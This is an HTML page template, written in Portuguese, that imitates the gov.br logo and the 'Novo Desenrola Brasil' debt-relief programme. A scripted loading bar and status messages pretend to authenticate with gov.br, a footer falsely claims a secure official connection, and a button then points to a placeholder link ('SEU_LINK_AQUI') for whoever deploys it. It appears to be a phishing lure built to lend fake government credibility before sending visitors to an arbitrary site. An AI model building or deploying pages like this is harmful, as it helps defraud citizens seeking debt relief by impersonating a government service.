<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Desenrola Brasil</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Rawline', 'Inter', Arial, sans-serif;
    background: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 28px;
    padding: 20px;
  }

  /* ---- LOGO GOV.BR ---- */
  .govbr-logo {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  /* Replica exata do logo gov.br: texto verde + .br amarelo */
  .govbr-text {
    font-size: 28px;
    font-weight: 900;
    color: #1351B4;
    font-family: Arial Black, Arial, sans-serif;
    letter-spacing: -1px;
    line-height: 1;
  }
  .govbr-text .dot-br {
    color: #FFCD07;
  }

  .sep { width: 1px; height: 40px; background: #ccc; margin: 0 4px; }

  /* ---- DESENROLA LOGO ---- */
  .desenrola-block {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    line-height: 1.1;
  }
  .d-novo {
    font-size: 10px;
    font-weight: 700;
    color: #1351B4;
    letter-spacing: 2px;
    text-transform: uppercase;
  }
  .d-desenrola {
    font-size: 20px;
    font-weight: 900;
    color: #1351B4;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  .d-brasil {
    font-size: 20px;
    font-weight: 900;
    color: #FFCD07;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    /* texto amarelo com contorno azul igual ao logo */
    -webkit-text-stroke: 0.5px #1351B4;
  }

  /* ---- STATUS ---- */
  #status {
    font-size: 14px;
    color: #555;
    letter-spacing: 0.3px;
    min-height: 20px;
    transition: opacity 0.25s;
    font-family: Arial, sans-serif;
  }

  /* ---- BARRA ---- */
  .bar-track {
    width: min(300px, 80vw);
    height: 4px;
    background: #E8E8E8;
    border-radius: 10px;
    overflow: hidden;
  }
  .bar-fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #1351B4, #FFCD07);
    border-radius: 10px;
    animation: fill 2.8s cubic-bezier(0.4,0,0.2,1) forwards;
  }
  @keyframes fill {
    0%   { width: 0% }
    60%  { width: 72% }
    85%  { width: 91% }
    100% { width: 100% }
  }

  /* ---- BOTÃO ---- */
  #btn {
    display: none;
    background: #1351B4;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    padding: 14px 40px;
    border: none;
    border-radius: 100px;
    cursor: pointer;
    text-decoration: none;
    letter-spacing: 0.3px;
    font-family: Arial, sans-serif;
    transition: background 0.15s, transform 0.15s;
    animation: fadeIn 0.5s ease;
  }
  #btn:hover { background: #0C3E8A; transform: translateY(-1px); }
  @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }

  /* ---- RODAPÉ ---- */
  .footer-note {
    font-size: 11px;
    color: #aaa;
    display: flex;
    align-items: center;
    gap: 6px;
    font-family: Arial, sans-serif;
  }
  .footer-note svg { flex-shrink: 0; }
</style>
</head>
<body>

  <!-- Logos -->
  <div style="display:flex;align-items:center;gap:16px;">
    <div class="govbr-logo">
      <div class="govbr-text">gov<span class="dot-br">.br</span></div>
    </div>
    <div class="sep"></div>
    <div class="desenrola-block">
      <span class="d-novo">Novo</span>
      <span class="d-desenrola">Desenrola</span>
      <span class="d-brasil">Brasil</span>
    </div>
  </div>

  <div id="status">Carregando site oficial…</div>

  <div class="bar-track" id="barWrap">
    <div class="bar-fill"></div>
  </div>

  <a href="SEU_LINK_AQUI" id="btn">Prosseguir para o site</a>

  <div class="footer-note">
    <svg width="10" height="12" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M5 0L.5 2.2v3.5C.5 8.6 2.4 11.3 5 12.5c2.6-1.2 4.5-3.9 4.5-6.8V2.2L5 0z" fill="#aaa"/>
    </svg>
    Conexão segura · gov.br oficial
  </div>

</body>
<script>
  const msgs = ['Carregando site oficial…', 'Autenticando com gov.br…', 'Estabelecendo conexão segura…'];
  const statusEl = document.getElementById('status');
  let i = 0;
  const iv = setInterval(() => {
    i++;
    if (i < msgs.length) {
      statusEl.style.opacity = 0;
      setTimeout(() => { statusEl.textContent = msgs[i]; statusEl.style.opacity = 1; }, 250);
    } else clearInterval(iv);
  }, 900);

  setTimeout(() => {
    document.getElementById('barWrap').style.display = 'none';
    statusEl.style.opacity = 0;
    setTimeout(() => { statusEl.style.display = 'none'; }, 300);
    document.getElementById('btn').style.display = 'inline-block';
  }, 3000);
</script>
</html>
